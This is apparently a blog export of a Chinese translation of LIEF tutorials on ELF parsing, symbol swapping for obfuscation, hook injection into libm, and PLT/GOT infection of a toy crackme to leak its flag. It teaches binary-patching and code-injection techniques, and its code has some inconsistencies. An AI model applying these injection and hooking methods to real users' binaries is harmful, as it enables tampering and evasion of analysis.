class=\"line\">hashme_pow_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"pow\"</span>, my_binary.imported_symbols))</div><div class=\"line\">hashme_log_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"log\"</span>, my_binary.imported_symbols))</div><div class=\"line\">hashme_pow_sym.name = <span class=\"string\">\"cos\"</span></div><div class=\"line\">hashme_log_sym.name = <span class=\"string\">\"sin\"</span></div></pre></td></tr></table></figure>\n<p>最后我们在库中用<code>log</code>交换<code>sin</code>，用<code>pow</code>交换<code>cos</code>，然后重构两个对象</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">hasme = lief.parse(<span class=\"string\">\"hasme\"</span>)</div><div class=\"line\">libm  = lief.parse(<span class=\"string\">\"/usr/lib/libm.so.6\"</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">swap</span><span class=\"params\">(obj, a, b)</span>:</span></div><div class=\"line\">    symbol_a = next(filter(<span class=\"keyword\">lambda</span> e : e.name == a, obj.dynamic_symbols))</div><div class=\"line\">    symbol_b = next(filter(<span class=\"keyword\">lambda</span> e : e.name == b, obj.dynamic_symbols))</div><div class=\"line\">    b_name = symbol_b.name</div><div class=\"line\">    symbol_b.name = symbol_a.name</div><div class=\"line\">    symbol_a.name = b_name</div><div class=\"line\"></div><div class=\"line\">hashme_pow_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"pow\"</span>, my_binary.imported_symbols))</div><div class=\"line\">hashme_log_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"log\"</span>, my_binary.imported_symbols))</div><div class=\"line\"></div><div class=\"line\">hashme_pow_sym.name = <span class=\"string\">\"cos\"</span></div><div class=\"line\">hashme_log_sym.name = <span class=\"string\">\"sin\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">swap(libm, <span class=\"string\">\"log\"</span>, <span class=\"string\">\"sin\"</span>)</div><div class=\"line\">swap(libm, <span class=\"string\">\"pow\"</span>, <span class=\"string\">\"cos\"</span>)</div><div class=\"line\"></div><div class=\"line\">hashme.write(<span class=\"string\">\"hashme.obf\"</span>)</div><div class=\"line\">libm.write(<span class=\"string\">\"libm.so.6\"</span>)</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/12/13/LIEF部分中文文档/2.png\" alt=\"\"><br>有了这个脚本，我们<code>libm</code>在当前目录下建立了一个修改，我们必须强制Linux加载器在执行时使用这个<code>binary.obf</code>。为此，我们export环境变量LD_LIBRARY_PATH到当前目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ LD_LIBRARY_PATH=. hashme.obf 123</div><div class=\"line\">228886645.836282</div></pre></td></tr></table></figure>\n<p>如果我们忽略它，它会使用默认<code>libm</code>和哈希计算完成<code>sin</code>和<code>cos</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hashme.obf 123</div><div class=\"line\">-0.557978</div></pre></td></tr></table></figure>\n<p>一个真正的用例可能是在像OpenSSL这样的密码库中交换符号。例如<code>EVP_DecryptInit</code>，<code>EVP_EncryptInit</code>有相同的原型，所以我们可以交换它们。</p>\n<h2 id=\"ELF挂钩\"><a href=\"#ELF挂钩\" class=\"headerlink\" title=\"ELF挂钩\"></a>ELF挂钩</h2><p>本教程的目标是钩住一个库函数<br>在前面的教程中，我们看到了如何从共享库中交换符号名称，现在我们将看到在共享库中挂钩函数的机制。</p>\n<p>目标库是标准的数学库(<code>libm.so</code>)，我们将在exp函数中插入一个钩子，使得(exp(x)= x + 1)。下面的清单给出了使用这个函数的样例的源代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Usage: %s &lt;a&gt; \\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">int</span> a = atoi(argv[<span class=\"number\">1</span>]);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"exp(%d) = %f\\n\"</span>, a, <span class=\"built_in\">exp</span>(a));</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>挂钩功能如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">hook</span><span class=\"params\">(<span class=\"keyword\">double</span> x)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> x + <span class=\"number\">1</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>编译<code>gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</code></p>\n<p>为了将这个钩子注入到库中，我们使用add()(段)方法</p>\n<p><code>Binary.add(*args, **kwargs)</code></p>\n<p>重载函数</p>\n<p>1.add(self: _pylief.ELF.Binary, arg0: LIEF::ELF::DynamicEntry) -&gt; LIEF::ELF::DynamicEntry</p>\n<p>dynamic_entry</p>\n<p>2.add(self: _pylief.ELF.Binary, section: LIEF::ELF::Section, loaded: bool=True) -&gt; LIEF::ELF::Section</p>\n<p>将给的<code>Section</code>添加到二进制文件中。<br>如果该部分不应加载到内存中，loaded参数必须设置为False（默认值：True）</p>\n<p>3.add（self:_pylief.ELF.Binary, segment:LIEF::ELF::Segment, base:int = 0）-&gt; LIEF::ELF::Segment</p>\n<p>在二进制文件中添加一个段</p>\n<p>4.add(self: _pylief.ELF.Binary, note: LIEF::ELF::Note) -&gt; LIEF::ELF::Note</p>\n<p>在二进制文件中添加一个行的<code>Note</code>一旦stub被注入，我们只需要改变exp符号的地址：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">exp_symbol  = libm.get_symbol(<span class=\"string\">\"exp\"</span>)</div><div class=\"line\">hook_symbol = hook.get_symbol(<span class=\"string\">\"hook\"</span>)</div><div class=\"line\"></div><div class=\"line\">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</div></pre></td></tr></table></figure>\n<p>测试修补过的库：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">./do_math.bin 1</div><div class=\"line\">exp(1) = 2.718282</div><div class=\"line\">LD_LIBRARY_PATH=. ./do_math.bin 1</div><div class=\"line\">exp(1) = 2.000000</div></pre></td></tr></table></figure>\n<h2 id=\"感染plt-got\"><a href=\"#感染plt-got\" class=\"headerlink\" title=\"感染plt / got\"></a>感染plt / got</h2><p>本教程的目标是在ELF二进制文件中挂接导入的函数。<br>通过感染<code>.got</code>部分挂钩导入的函数是一个众所周知的技术，本教程将重点介绍使用LIEF的实现。</p>\n<p>这些数字说明了这个plt/got机制：<br><img src=\"/2017/12/13/LIEF部分中文文档/3.png\" alt=\"\"><br>使用延迟绑定，第一次调用该函数时，该<code>got</code>条目将重定向到plt指令。<br><img src=\"/2017/12/13/LIEF部分中文文档/4.png\" alt=\"\"><br>第二次，<code>got</code>条目在共享库中保存地址<br>基本上感染分两步完成：</p>\n<ul>\n<li>首先，我们注入我们的钩子</li>\n<li>其次，我们通过打补丁将目标函数重定向到我们的钩子<code>got</code></li>\n</ul>\n<p>可以用下图来总结：<br><img src=\"/2017/12/13/LIEF部分中文文档/5.png\" alt=\"\"><br>作为例子，我们将使用一个基本的crackme在<code>memcmp</code>上的Flag和用户的输入。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;stdlib.h&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;string.h&gt;</span></div><div class=\"line\"></div><div class=\"line\">// Damn_YoU_Got_The_Flag</div><div class=\"line\">char password[] = <span class=\"string\">\"\\x18\\x3d\\x31\\x32\\x03\\x05\\x33\\x09\\x03\\x1b\\x33\\x28\\x03\\x08\\x34\\x39\\x03\\x1a\\x30\\x3d\\x3b\"</span>;</div><div class=\"line\"></div><div class=\"line\">inline int check(char* input);</div><div class=\"line\"></div><div class=\"line\">int check(char* input) &#123;</div><div class=\"line\">  <span class=\"keyword\">for</span> (int i = <span class=\"number\">0</span>; i &lt; sizeof(password) - <span class=\"number\">1</span>; ++i) &#123;</div><div class=\"line\">    password[i] ^= <span class=\"number\">0x5c</span>;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">return</span> memcmp(password, input, sizeof(password) - <span class=\"number\">1</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">int main(int argc, char **argv) &#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</div><div class=\"line\">    printf(<span class=\"string\">\"Usage: %s &lt;password&gt;\\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">    <span class=\"keyword\">return</span> EXIT_FAILURE;</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> (strlen(argv[<span class=\"number\">1</span>]) == (sizeof(password) - <span class=\"number\">1</span>) &amp;&amp; check(argv[<span class=\"number\">1</span>]) == <span class=\"number\">0</span>) &#123;</div><div class=\"line\">    puts(<span class=\"string\">\"You got it !!\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> EXIT_SUCCESS;</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  puts(<span class=\"string\">\"Wrong\"</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> EXIT_FAILURE;</div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>这个Flag的值和<code>0x5c</code>进行了<code>xor</code>操作，为了验证crackme，用户必须输入<code>Damn_YoU_Got_The_Flag</code>:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ crackme.bin foo</div><div class=\"line\">Wrong</div><div class=\"line\">$ crackme.bin Damn_YoU_Got_The_Flag</div><div class=\"line\">You got it !!</div></pre></td></tr></table></figure>\n<p>挂钩将包含打印参数<code>memcmp</code>并返回0：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"arch/x86_64/syscall.c\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> stdout 1</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">my_memcmp</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">void</span>* lhs, <span class=\"keyword\">const</span> <span class=\"keyword\">void</span>* rhs, <span class=\"keyword\">int</span> n)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> msg[] = <span class=\"string\">\"Hook memcmp\\n\"</span>;</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, msg, <span class=\"keyword\">sizeof</span>(msg));</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*)lhs, n);</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, <span class=\"string\">\"\\n\"</span>, <span class=\"number\">2</span>);</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*)rhs, n);</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, <span class=\"string\">\"\\n\"</span>, <span class=\"number\">2</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>由于钩子将被注入Creakme，因此它必须具备以下要求：</p>\n<ul>\n<li>汇编代码必须是位置独立的(使用<code>-fPIC</code>或<code>-pie/-fPIE</code>标记编译)</li>\n<li>不要使用外部库比如<code>libc.so</code>(标志)<code>-nostdlib -nodefaultlibs</code>(标志)</li>\n</ul>\n<p>基于要求，这个钩子的编译为：<code>gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</code></p>\n<h3 id=\"注入钩子\"><a href=\"#注入钩子\" class=\"headerlink\" title=\"注入钩子\"></a>注入钩子</h3><p>第一步是将钩子注入bin。为此我们将添加一个<code>Segment</code>:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\"></div><div class=\"line\">crackme = lief.parse(<span class=\"string\">\"crackme.bin\"</span>)</div><div class=\"line\">hook    = lief.parse(<span class=\"string\">\"hook\"</span>)</div><div class=\"line\"></div><div class=\"line\">segment_added  = crackme.add(hook.segments[<span class=\"number\">0</span>])</div></pre></td></tr></table></figure>\n<p>钩子的所有汇编代码都存在<code>hook</code>的第一段的<code>LOAD</code>中。<br>一旦钩子被添加，钩子的虚拟地址是<code>segment_added</code>的虚拟地址<code>virtual_address</code>,然后我们进行<code>got</code>patch。</p>\n<h3 id=\"Patching-got\"><a href=\"#Patching-got\" class=\"headerlink\" title=\"Patching got\"></a>Patching <code>got</code></h3><p>LIEF提供了一个功能，可以轻松修补<code>got</code>与<code>Symbol</code>相关的条目：</p>\n<p><code>Binary.patch_pltgot（* args，** kwargs ）</code></p>\n<p>重载函数<br>1.patch_pltgot(self: _pylief.ELF.Binary, symbol_name: str, address: int) -&gt; None</p>\n<p>用导入的符号名称Patch <code>address</code></p>\n<p>2.patch_pltgot(self: _pylief.ELF.Binary, symbol: LIEF::ELF::Symbol, address: int) -&gt; None</p>\n<p>Patch导入的<code>Symbol</code>和<code>address</code></p>\n<p><code>memcmp</code>函数的偏移量存储在value关联的动态符号的属性中。因此，它的虚拟地址将是：</p>\n<ul>\n<li><code>my_memcpy</code>= <code>value</code> + <code>segment_added.virtual_address</code></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">my_memcmp      = hook.get_symbol(<span class=\"string\">\"my_memcmp\"</span>)</div><div class=\"line\">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</div></pre></td></tr></table></figure>\n<p>最后我们可以用<code>memcmp</code>的值来patch这个crackme.</p>\n<p><code>crackme.patch_pltgot(&#39;memcmp&#39;, my_memcmp_addr)</code></p>\n<p>最后rebuild</p>\n<p><code>crackme.write(&quot;crackme.hooked&quot;)</code></p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>由于在检查标志值之前检查输入大小，我们必须提供正确长度的输入（不管其内容）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ crackme.hooked XXXXXXXXXXXXXXXXXXXXX</div><div class=\"line\">Hook add</div><div class=\"line\">Damn_YoU_Got_The_Flag</div><div class=\"line\">XXXXXXXXXXXXXXXXXXXXX</div><div class=\"line\">You got it !!</div></pre></td></tr></table></figure>\n","excerpt":"<h1 id=\"LIEF\"><a href=\"#LIEF\" class=\"headerlink\" title=\"LIEF\"></a>LIEF</h1><h2 id=\"分析和操作格式\"><a href=\"#分析和操作格式\" class=\"headerlink\" title=\"分析和操作格式\"></a>分析和操作格式</h2><p>这部分教程的目的是概述LIEF的API用来分析处理文件的格式<br>// 由学弟翻译整理<br></p>","more":"<p></p>\n<h3 id=\"ELF\"><a href=\"#ELF\" class=\"headerlink\" title=\"ELF\"></a>ELF</h3><ul>\n<li>我们从ELF格式开始。要从一个文件创建一个ELF.Binary,我们只需朝lief.parse()或lief.ELF.parse()函数传入他的路径。</li>\n</ul>\n<blockquote>\n<p>注意：如果使用的是python的API，那么lief.parse()和lief.ELF.parse()具有相同的行为。但是在C++中，LIEF::Parser::parse()将返回指向LIEF::Binary对象的指针，而LIEF::ELF::Parser::parse()将返回LIEF::ELF::**</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\">Binary = lief.parse(<span class=\"string\">\"/bin/ls\"</span>)</div></pre></td></tr></table></figure>\n<p> 一旦ELF文件被解析，我们可以访问它的Header</p>\n<p><code>header = binary.header</code></p>\n<p> 我们还可以更改它的入口点和目标架构(ARCH)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">header.entrypoint = <span class=\"number\">0x123</span></div><div class=\"line\">header.machine_type = lief.ELF.ARCH.AARCH64</div></pre></td></tr></table></figure>\n<p>并重建这个文件<br><code>binary.write(&quot;ls.modified&quot;)</code></p>\n<ul>\n<li>我们也可以遍历这个二进制文件的段部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> section <span class=\"keyword\">in</span> sections:</div><div class=\"line\">    <span class=\"keyword\">print</span> section.name</div><div class=\"line\">    <span class=\"keyword\">print</span> section.size</div><div class=\"line\">    <span class=\"keyword\">print</span> len(section.content)</div></pre></td></tr></table></figure>\n<p>也可以修改它的<code>.text</code>部分</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">text = binary.get_section(<span class=\"string\">\".text\"</span>)</div><div class=\"line\">text.content = bytes([<span class=\"number\">0x33</span>] * text.size)</div></pre></td></tr></table></figure>\n<h2 id=\"玩转ELF符号\"><a href=\"#玩转ELF符号\" class=\"headerlink\" title=\"玩转ELF符号\"></a>玩转ELF符号</h2><p>在本教程中，我们将会介绍如何修改二进制及库中的动态符号。当二进制文件将要链接到库的时候，所需要用到的库储存在动态表的DT_NEEDED条目中，所需要的功能在表中注册并具有以下属性：</p>\n<ul>\n<li><code>value</code> 设置为 <code>0</code></li>\n<li><code>种类</code> 设置为 <code>FUNC</code>类似的，当一个库导出函数时，它在动态表中有一个DT_SONAME条目，导出的函数在动态符号表中注册，并具有如下属性：</li>\n<li><code>value</code> 设置为库中函数地址</li>\n<li><code>type</code> 设置为 <code>FUNC</code>而导入导出函数由LIEF来抽象，因此你可以使用<code>exported_functions</code>和<code>imported_functions</code>来遍历这些元素</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\">binary  = lief.parse(<span class=\"string\">\"/usr/bin/ls\"</span>)</div><div class=\"line\">library = lief.parse(<span class=\"string\">\"/usr/lib/libc.so.6\"</span>)</div><div class=\"line\">print(binary.imported_functions)</div><div class=\"line\">print(library.exported_functions)</div></pre></td></tr></table></figure>\n<p>在分析二进制文件时，导入的函数名称对逆向工程非常有用。 一个解决方案是静态链接二进制文件和库。 另一个解决方案是通过交换这些符号来打击逆转者的思维。比如以下代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">hashme</span><span class=\"params\">(<span class=\"keyword\">double</span> input)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">pow</span>(input, <span class=\"number\">4</span>) + <span class=\"built_in\">log</span>(input + <span class=\"number\">3</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Usage: %s N\\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">    <span class=\"keyword\">return</span> EXIT_FAILURE;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">double</span> N = (<span class=\"keyword\">double</span>)atoi(argv[<span class=\"number\">1</span>]);</div><div class=\"line\">  <span class=\"keyword\">double</span> hash = hashme(N);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%f\\n\"</span>, hash);</div><div class=\"line\">  <span class=\"keyword\">return</span> EXIT_SUCCESS;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>这本书基本上是让这个程序接受一个整数作为参数，并对这个值进行一些计算。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hasme 123</div><div class=\"line\">228886645.836282</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/12/13/LIEF部分中文文档/hashme.png\" alt=\"\"></p>\n<p>该pow和log功能都位于libm.so.6库中。使用LIEF的一个有趣的技巧是将此函数名称与其他函数名称交换。在本教程中，我们将把他们交换为cos和sin。首先，我们必须加载库和二进制文件：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">＃/usr/bin/env python3</div><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\">hasme = lief.parse(<span class=\"string\">\"hasme\"</span>)</div><div class=\"line\">libm = lief.parse(<span class=\"string\">\"/usr/lib/libm.so.6\"</span>)</div></pre></td></tr></table></figure>\n<p>然后当更改二进制中的两个导入函数的名称时：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">hashme_pow_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"pow\"</span>, my_binary.imported_symbols))</div><div class=\"line\">hashme_log_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"log\"</span>, my_binary.imported_symbols))</div><div class=\"line\">hashme_pow_sym.name = <span class=\"string\">\"cos\"</span></div><div class=\"line\">hashme_log_sym.name = <span class=\"string\">\"sin\"</span></div></pre></td></tr></table></figure>\n<p>最后我们在库中用<code>log</code>交换<code>sin</code>，用<code>pow</code>交换<code>cos</code>，然后重构两个对象</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">hasme = lief.parse(<span class=\"string\">\"hasme\"</span>)</div><div class=\"line\">libm  = lief.parse(<span class=\"string\">\"/usr/lib/libm.so.6\"</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">swap</span><span class=\"params\">(obj, a, b)</span>:</span></div><div class=\"line\">    symbol_a = next(filter(<span class=\"keyword\">lambda</span> e : e.name == a, obj.dynamic_symbols))</div><div class=\"line\">    symbol_b = next(filter(<span class=\"keyword\">lambda</span> e : e.name == b, obj.dynamic_symbols))</div><div class=\"line\">    b_name = symbol_b.name</div><div class=\"line\">    symbol_b.name 